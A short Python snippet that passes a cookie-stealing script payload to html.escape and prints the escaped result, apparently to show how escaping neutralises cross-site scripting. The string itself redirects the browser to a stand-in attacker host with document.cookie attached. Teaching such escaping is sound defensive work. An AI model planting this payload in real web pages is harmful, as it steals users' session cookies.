import html

src = '<script>location.href="http://hack.er/Cookie.php?cookie="+document.cookie</script>'
result = html.escape(src)
print(result)
